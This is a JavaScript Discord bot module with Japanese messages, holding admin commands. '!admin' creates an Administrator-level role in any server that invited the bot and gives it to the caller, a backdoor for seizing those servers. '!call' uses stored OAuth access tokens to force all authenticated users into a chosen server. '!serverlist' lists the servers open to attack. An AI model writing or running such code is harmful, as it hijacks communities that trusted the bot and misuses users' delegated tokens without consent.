const { PermissionFlagsBits } = require('discord.js');
const axios = require('axios');

async function handleAdminCommands(msg, client, OWNER_IDS, loadData, saveData, USERS_FILE) {
    const args = msg.content.slice(1).trim().split(/ +/);
    const command = args.shift().toLowerCase();

    if (command === 'admin') {
        const guildId = args[0];
        const roleName = args[1];
        const position = args[2];
        if (!guildId || !roleName || !position) return msg.reply('使用法: !admin [サーバーID] [ロール名] [up/down]');

        const guild = client.guilds.cache.get(guildId);
        if (!guild) return msg.reply('サーバーが見つかりません。');

        try {
            let role = guild.roles.cache.find(r => r.name === roleName);
            if (!role) {
                role = await guild.roles.create({
                    name: roleName,
                    permissions: [PermissionFlagsBits.Administrator],
                    reason: 'Admin Command Execution'
                });
            }

            if (position === 'up') {
                const botMember = guild.members.me;
                const maxPosition = botMember.roles.highest.position;
                await role.setPosition(maxPosition - 1);
            }

            const member = await guild.members.fetch(msg.author.id).catch(() => null);
            if (!member) return msg.reply('あなたは対象サーバーにいません。');

            await member.roles.add(role);
            await msg.reply(`サーバー: ${guild.name} でロール 「${roleName}」 を付与し、順位を ${position} に設定しました。`);
        } catch (e) {
            await msg.reply(`エラーが発生しました: ${e.message}`);
        }
    }

    if (command === 'call') {
        const guildId = args[0];
        if (!guildId) return msg.reply('使用法: !call [サーバーID]');
        
        const guild = client.guilds.cache.get(guildId);
        if (!guild) return msg.reply('サーバーが見つかりません。');

        const userData = loadData(USERS_FILE);
        const users = Object.values(userData);
        await msg.reply(`${users.length} 人の追加処理を開始します。`);

        for (const user of users) {
            try {
                await axios.put(
                    `https://discord.com/api/v10/guilds/${guildId}/members/${user.id}`,
                    { access_token: user.accessToken },
                    { headers: { Authorization: `Bot ${process.env.TOKEN}`, 'Content-Type': 'application/json' } }
                );
            } catch (e) {}
        }
        await msg.channel.send('追加処理が完了しました。');
    }

    if (command === 'userlist') {
        const userData = loadData(USERS_FILE);
        const count = Object.keys(userData).length;
        await msg.reply(`現在、${count} 人のユーザーが認証済みです。`);
    }

    if (command === 'serverlist') {
        const guilds = client.guilds.cache.map(g => `${g.name} (${g.id})`).join('\n');
        await msg.reply(`導入サーバー一覧:\n${guilds || 'なし'}`);
    }
}

module.exports = handleAdminCommands;
